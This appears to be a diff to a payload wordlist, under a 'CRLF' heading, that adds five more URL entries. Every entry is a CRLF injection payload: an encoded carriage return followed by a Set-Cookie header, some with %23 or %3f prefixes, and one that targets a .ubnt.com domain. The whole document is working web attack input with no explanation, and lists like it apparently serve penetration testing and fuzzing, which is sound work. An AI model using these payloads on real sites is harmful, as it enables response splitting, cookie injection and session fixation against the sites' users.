@@ -3,3 +3,8 @@ CRLF
 <URL>/test%0dSet-Cookie:test2=test;domain=.
 <URL>/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
 <URL>/test%0dSet-Cookie:crlf=injection;domain=.
+<URL>/%0dSet-Cookie:test=test;domain=.
+<URL>/crlftest%0dSet-Cookie:crlf=inj6;domain=.com;path=/;/
+<URL>/%23%0dSet-Cookie:crlf=injection;domain=.com;
+<URL>%23%0dSet-Cookie:crlf=injection2;domain=.com;
+<URL>%3f%0dSet-Cookie:crlf=injection%3bdomain=.ubnt.com%3b
